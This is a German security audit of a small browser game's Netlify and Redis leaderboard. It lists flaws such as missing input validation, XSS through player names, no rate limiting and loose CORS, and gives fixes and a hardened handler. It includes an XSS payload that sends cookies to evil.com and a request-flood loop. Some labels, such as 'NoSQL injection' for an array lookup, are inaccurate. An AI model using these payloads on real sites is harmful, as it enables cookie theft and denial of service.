# ðŸ”´ SECURITY AUDIT: The Glitch Dungeon
## Penetration Testing Report

**Audit Datum:** 07.12.2025  
**Schweregrad-Skala:** ðŸ”´ KRITISCH | ðŸŸ  HOCH | ðŸŸ¡ MITTEL | ðŸŸ¢ NIEDRIG

---

## ðŸ”´ KRITISCHE SICHERHEITSLÃœCKEN

### 1. **NoSQL Injection im Leaderboard** ðŸ”´ KRITISCH
**Datei:** `leaderboard.js`  
**Zeilen:** 26-28, 43-44

**Problem:**
```javascript
const { data } = body;
const key = KEYS[data[1]];  // KEINE VALIDIERUNG!
```

**Angriffsvektoren:**
- Ein Angreifer kann `data[1]` manipulieren und beliebige Redis-Keys lesen/schreiben
- Beispiel-Payload: `data[1] = "../../../admin_key"`
- Array-Index kann negativ sein: `data[1] = -1`
- Kann zu Crash fÃ¼hren: `data[1] = "constructor"`

**Exploit-Beispiel:**
```javascript
// Angreifer sendet:
fetch('https://deine-site.netlify.app/.netlify/functions/leaderboard', {
  method: 'POST',
  body: JSON.stringify({
    data: [null, 999, null, null, null, null, null, null, null]  // Index auÃŸerhalb
  })
});
```

**LÃ¶sung:**
```javascript
// VORHER:
const key = KEYS[data[1]];

// NACHHER:
const classIdx = parseInt(data[1]);
if (classIdx < 0 || classIdx >= KEYS.length) {
  throw new Error("Invalid class index");
}
const key = KEYS[classIdx];
```

---

### 2. **Fehlende Input-Validierung** ðŸ”´ KRITISCH
**Datei:** `leaderboard.js`  
**Zeilen:** 24-45

**Problem:**
- KEINE Validierung der eingehenden Daten
- `data` Array kann beliebige LÃ¤nge/Typen enthalten
- Kann zu Memory-Exhaustion fÃ¼hren

**Angriffsvektoren:**
```javascript
// 1. Riesiges Array senden (DoS)
{ data: new Array(1000000).fill("ðŸ’€") }

// 2. UngÃ¼ltige Datentypen
{ data: [null, null, {exploit: true}, ...] }

// 3. Extrem lange Strings (Memory DoS)
{ data: ["A".repeat(10000000), ...] }
```

**LÃ¶sung:**
```javascript
// Input-Validierung am Anfang:
if (!Array.isArray(data) || data.length !== 9) {
  throw new Error("Invalid data format");
}

// Validiere jeden Wert
const [name, classIdx, depth, moves, kills, deaths, gear, timestamp, uid] = data;

if (typeof name !== 'string' || name.length > 30) {
  throw new Error("Invalid name");
}
if (typeof classIdx !== 'number' || classIdx < 0 || classIdx > 2) {
  throw new Error("Invalid class");
}
if (typeof depth !== 'number' || depth < 0 || depth > 1000) {
  throw new Error("Invalid depth");
}
// ... weitere Validierungen
```

---

### 3. **XSS-Vulnerabilities durch unsanitized Names** ðŸ”´ KRITISCH
**Dateien:** `index.html` (Zeile 1264+), `leaderboard.js`

**Problem:**
- Spielernamen werden NICHT escaped/sanitized
- XSS mÃ¶glich durch Namen wie: `<script>alert(1)</script>`
- Kann Cookies stehlen, Malware injizieren, etc.

**Exploit-Beispiel:**
```javascript
// Client-Side (index.html):
meta.name = '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';

// Wird dann ungefiltert im Leaderboard angezeigt!
```

**LÃ¶sung (Client-Side in index.html):**
```javascript
// FÃ¼ge diese Funktion hinzu:
function sanitizeName(name) {
  const div = document.createElement('div');
  div.textContent = name;
  return div.innerHTML.substring(0, 30);
}

// Verwende beim Setzen:
meta.name = sanitizeName(prompt("Name?") || "Held");
```

**LÃ¶sung (Server-Side in leaderboard.js):**
```javascript
function sanitizeString(str) {
  if (typeof str !== 'string') return '';
  return str
    .replace(/[<>'"]/g, '')
    .substring(0, 30);
}

// Vor dem Speichern:
data[0] = sanitizeString(data[0]); // Name sanitizen
```

---

## ðŸŸ  HOHE SICHERHEITSRISIKEN

### 4. **Fehlende Rate Limiting** ðŸŸ  HOCH
**Datei:** `leaderboard.js`

**Problem:**
- Keine Rate Limits auf POST-Requests
- Angreifer kann tausende Requests senden
- Kann deine Netlify- und Redis-Limits sprengen

**Exploit:**
```javascript
// DoS durch Spam:
for (let i = 0; i < 10000; i++) {
  fetch('https://deine-site/.netlify/functions/leaderboard', {
    method: 'POST',
    body: JSON.stringify({data: [...]})
  });
}
```

**LÃ¶sung:**
```javascript
const rateLimit = {};
const RATE_LIMIT = 10; // Max 10 requests pro Minute
const RATE_WINDOW = 60000; // 1 Minute

function checkRateLimit(ip) {
  const now = Date.now();
  if (!rateLimit[ip]) {
    rateLimit[ip] = { count: 1, resetTime: now + RATE_WINDOW };
    return true;
  }
  
  if (now > rateLimit[ip].resetTime) {
    rateLimit[ip] = { count: 1, resetTime: now + RATE_WINDOW };
    return true;
  }
  
  if (rateLimit[ip].count >= RATE_LIMIT) {
    return false;
  }
  
  rateLimit[ip].count++;
  return true;
}

// Im Handler:
const ip = event.headers['x-forwarded-for'] || event.headers['client-ip'];
if (!checkRateLimit(ip)) {
  return {
    statusCode: 429,
    headers,
    body: JSON.stringify({ error: 'Too many requests' })
  };
}
```

---

### 5. **Memory Leak durch unbegrenzte UIDs** ðŸŸ  HOCH
**Datei:** `leaderboard.js`, Zeile 28

**Problem:**
```javascript
if(data[8]) arr = arr.filter(e => e[8] !== data[8]);
```
- Alte EintrÃ¤ge werden nicht gelÃ¶scht
- Bei 1 Million Spielern = 1 Million Filter-Operationen
- Redis-Key wird immer grÃ¶ÃŸer

**LÃ¶sung:**
```javascript
// Setze ein Maximum fÃ¼r den gesamten Leaderboard-Array:
const MAX_ENTRIES_BEFORE_CLEANUP = 100;

if (arr.length > MAX_ENTRIES_BEFORE_CLEANUP) {
  // Behalte nur die relevanten EintrÃ¤ge
  arr = arr.slice(0, 50);
}

// Dann erst filtern:
if(data[8]) arr = arr.filter(e => e[8] !== data[8]);
```

---

### 6. **Keine HTTPS-Enforcement** ðŸŸ  HOCH
**Datei:** `index.html`, Client-Code

**Problem:**
- API-Calls haben kein explizites HTTPS
- Bei Mixed Content kÃ¶nnen Daten abgefangen werden

**LÃ¶sung:**
```javascript
// In index.html bei API_URL:
const API_URL = 'https://deine-site.netlify.app/.netlify/functions/leaderboard';
// NICHT: let API_URL = window.location.origin + '/.netlify/functions/leaderboard';
```

---

## ðŸŸ¡ MITTLERE RISIKEN

### 7. **Redis Connection Leak** ðŸŸ¡ MITTEL
**Datei:** `leaderboard.js`

**Problem:**
```javascript
client.quit(); // Wird aufgerufen, aber kein await
```
- Bei Fehlern kann Connection nicht geschlossen werden
- FÃ¼hrt zu Connection Pool Exhaustion

**LÃ¶sung:**
```javascript
let client;
try {
  client = new Redis(process.env.REDIS_URL);
  // ... operations
} catch (error) {
  console.error('Error:', error);
} finally {
  if (client) {
    await client.quit();
  }
}
```

---

### 8. **Fehlende CORS-Policy** ðŸŸ¡ MITTEL
**Datei:** `leaderboard.js`, Zeile 4

**Problem:**
```javascript
'Access-Control-Allow-Origin': '*'  // ERLAUBT ALLE DOMAINS!
```

**LÃ¶sung:**
```javascript
const ALLOWED_ORIGINS = [
  'https://deine-site.netlify.app',
  'http://localhost:8888' // FÃ¼r Development
];

const origin = event.headers.origin || '';
const headers = {
  'Access-Control-Allow-Origin': ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0],
  'Content-Type': 'application/json'
};
```

---

### 9. **Timestamp Manipulation** ðŸŸ¡ MITTEL
**Datei:** Client sendet Timestamp

**Problem:**
- Client sendet `data[7]` (Timestamp) selbst
- Kann manipuliert werden fÃ¼r falsche Zeitstempel

**LÃ¶sung:**
```javascript
// Server-Side Timestamp:
data[7] = Date.now(); // Ãœberschreibe Client-Timestamp
```

---

### 10. **Fehlende Error Messages Sanitization** ðŸŸ¡ MITTEL
**Datei:** `leaderboard.js`, Zeile 73

**Problem:**
```javascript
body: JSON.stringify({ error: error.message })
```
- Kann interne Pfade, Redis-Details leaken

**LÃ¶sung:**
```javascript
body: JSON.stringify({ 
  error: process.env.NODE_ENV === 'production' 
    ? 'Internal server error' 
    : error.message 
})
```

---

## ðŸŸ¢ GERINGE RISIKEN / BEST PRACTICES

### 11. **Keine Request Size Limits** ðŸŸ¢ NIEDRIG
**LÃ¶sung:**
```javascript
if (event.body && event.body.length > 10000) {
  return {
    statusCode: 413,
    headers,
    body: JSON.stringify({ error: 'Payload too large' })
  };
}
```

---

### 12. **Console.log in Production** ðŸŸ¢ NIEDRIG
**Datei:** `leaderboard.js`, Zeile 72

**Problem:**
- `console.error` in Production kann Logs fÃ¼llen

**LÃ¶sung:**
```javascript
if (process.env.NODE_ENV !== 'production') {
  console.error('Leaderboard Error:', error);
}
```

---

## ðŸ“Š RECHTLICHE / DSGVO BEDENKEN

### 13. **IP-Adressen werden verarbeitet** âš–ï¸
**Datei:** `impressum.html`

**Problem:**
- Du erwÃ¤hnst, dass IPs "nicht dauerhaft verknÃ¼pft" werden
- Aber: IPs werden bei Netlify/Redis Logs gespeichert
- Kann DSGVO-Problem sein

**Empfehlung:**
- FÃ¼ge hinzu: "IP-Adressen werden fÃ¼r maximal 30 Tage in System-Logs gespeichert"
- Biete Opt-Out oder anonymen Modus an

---

### 14. **Fehlende Consent fÃ¼r Google Fonts** âš–ï¸
**Problem:**
- Google Fonts werden geladen OHNE Consent
- DSGVO verlangt Einwilligung fÃ¼r Drittanbieter-Cookies

**LÃ¶sung:**
- Self-host die Fonts ODER
- Cookie-Banner mit Google Fonts Opt-In

---

## ðŸ›¡ï¸ GEHÃ„RTETER CODE

### Kompletter gehÃ¤rteter `leaderboard.js`:

```javascript
const Redis = require("ioredis");

const KEYS = ['GD_TOP_WAR', 'GD_TOP_ROG', 'GD_TOP_MAG'];
const ALLOWED_ORIGINS = [
  'https://deine-site.netlify.app'
];

// Rate Limiting
const rateLimit = {};
const RATE_LIMIT = 10;
const RATE_WINDOW = 60000;

function checkRateLimit(ip) {
  const now = Date.now();
  if (!rateLimit[ip]) {
    rateLimit[ip] = { count: 1, resetTime: now + RATE_WINDOW };
    return true;
  }
  if (now > rateLimit[ip].resetTime) {
    rateLimit[ip] = { count: 1, resetTime: now + RATE_WINDOW };
    return true;
  }
  if (rateLimit[ip].count >= RATE_LIMIT) return false;
  rateLimit[ip].count++;
  return true;
}

function sanitizeString(str) {
  if (typeof str !== 'string') return '';
  return str.replace(/[<>'"&]/g, '').substring(0, 30);
}

function validateData(data) {
  if (!Array.isArray(data) || data.length !== 9) {
    throw new Error("Invalid data format");
  }
  
  const [name, classIdx, depth, moves, kills, deaths, gear, timestamp, uid] = data;
  
  if (typeof name !== 'string' || name.length > 30) {
    throw new Error("Invalid name");
  }
  if (typeof classIdx !== 'number' || classIdx < 0 || classIdx > 2) {
    throw new Error("Invalid class");
  }
  if (typeof depth !== 'number' || depth < 0 || depth > 1000) {
    throw new Error("Invalid depth");
  }
  if (typeof moves !== 'number' || moves < 0) {
    throw new Error("Invalid moves");
  }
  if (typeof kills !== 'number' || kills < 0) {
    throw new Error("Invalid kills");
  }
  
  return true;
}

exports.handler = async (event, context) => {
  const origin = event.headers.origin || '';
  const headers = {
    'Access-Control-Allow-Origin': ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0],
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  // Request Size Check
  if (event.body && event.body.length > 10000) {
    return {
      statusCode: 413,
      headers,
      body: JSON.stringify({ error: 'Payload too large' })
    };
  }

  // Rate Limiting
  const ip = event.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
  if (!checkRateLimit(ip)) {
    return {
      statusCode: 429,
      headers,
      body: JSON.stringify({ error: 'Too many requests. Please try again later.' })
    };
  }

  let client;
  try {
    if (!process.env.REDIS_URL) {
      throw new Error("REDIS_URL environment variable is missing");
    }
    
    client = new Redis(process.env.REDIS_URL);

    if (event.httpMethod === 'POST') {
      const body = JSON.parse(event.body);
      let { data } = body;
      
      // Validiere Input
      validateData(data);
      
      // Sanitize Name
      data[0] = sanitizeString(data[0]);
      
      // Server-side Timestamp
      data[7] = Date.now();
      
      // Validiere Class Index
      const classIdx = parseInt(data[1]);
      if (classIdx < 0 || classIdx >= KEYS.length) {
        throw new Error("Invalid class index");
      }
      const key = KEYS[classIdx];

      let raw = await client.get(key);
      let arr = raw ? JSON.parse(raw) : [];

      // Remove previous entry
      if (data[8]) {
        arr = arr.filter(e => e[8] !== data[8]);
      }

      arr.push(data);

      // Sort
      arr.sort((a, b) => b[2] - a[2] || a[3] - b[3] || b[4] - a[4]);

      // Keep only top 5
      arr = arr.slice(0, 5);

      await client.set(key, JSON.stringify(arr));

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ ok: true })
      };

    } else if (event.httpMethod === 'GET') {
      const classIdx = parseInt(event.queryStringParameters?.class || '0');
      
      if (classIdx < 0 || classIdx >= KEYS.length) {
        throw new Error("Invalid class index");
      }
      
      const key = KEYS[classIdx];
      const raw = await client.get(key);
      const top = raw ? JSON.parse(raw) : [];

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ top })
      };
    } else {
      return {
        statusCode: 405,
        headers,
        body: JSON.stringify({ error: 'Method not allowed' })
      };
    }

  } catch (error) {
    const errorMessage = process.env.NODE_ENV === 'production'
      ? 'Internal server error'
      : error.message;
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: errorMessage })
    };
  } finally {
    if (client) {
      await client.quit();
    }
  }
};
```

---

## âœ… SOFORT UMSETZBARE MASSNAHMEN (Vor LinkedIn-Post!)

### KRITISCH - JETZT:
1. âœ… Input-Validierung fÃ¼r `data` Array hinzufÃ¼gen
2. âœ… XSS-Protection durch Name-Sanitization
3. âœ… Rate Limiting implementieren
4. âœ… Class-Index Validierung (Array-Out-of-Bounds verhindern)

### WICHTIG - HEUTE:
5. âœ… Redis Connection Leak fixen (finally block)
6. âœ… CORS auf deine Domain einschrÃ¤nken
7. âœ… Error Messages sanitizen
8. âœ… Server-side Timestamp erzwingen

### OPTIONAL - DIESE WOCHE:
9. âšª Google Fonts self-hosten oder Cookie-Banner
10. âšª Request Size Limits
11. âšª Impressum/DSGVO aktualisieren

---

## ðŸŽ¯ ZUSAMMENFASSUNG

**Aktueller Sicherheitsstatus:** ðŸ”´ **KRITISCH - NICHT PRODUKTIONSREIF**

**GrÃ¶ÃŸte Bedrohungen:**
1. NoSQL Injection â†’ Redis kompromittiert
2. XSS durch Namen â†’ User-Daten stehlen
3. DoS durch fehlende Rate Limits â†’ Kosten explodieren
4. Input-Validierung fehlt komplett â†’ Beliebige Payloads

**Nach Umsetzung der KRITISCHEN Fixes:** ðŸŸ¢ **Produktionsreif fÃ¼r kleines Projekt**

**GeschÃ¤tzter Aufwand:** 2-3 Stunden fÃ¼r alle kritischen Fixes

---

## ðŸ“ž NÃ„CHSTE SCHRITTE

1. **JETZT:** Implementiere den gehÃ¤rteten `leaderboard.js` (siehe oben)
2. **JETZT:** FÃ¼ge Name-Sanitization im Client hinzu
3. **HEUTE:** Teste mit Curl/Postman die verschiedenen Angriffsvektoren
4. **MORGEN:** LinkedIn-Post nur NACH erfolgreichen Tests!

---

**Disclaimer:** Dieses Audit deckt bekannte Angriffsvektoren ab, garantiert aber keine 100%ige Sicherheit. FÃ¼r Production-kritische Anwendungen sollte ein professionelles Penetration Testing durchgefÃ¼hrt werden.
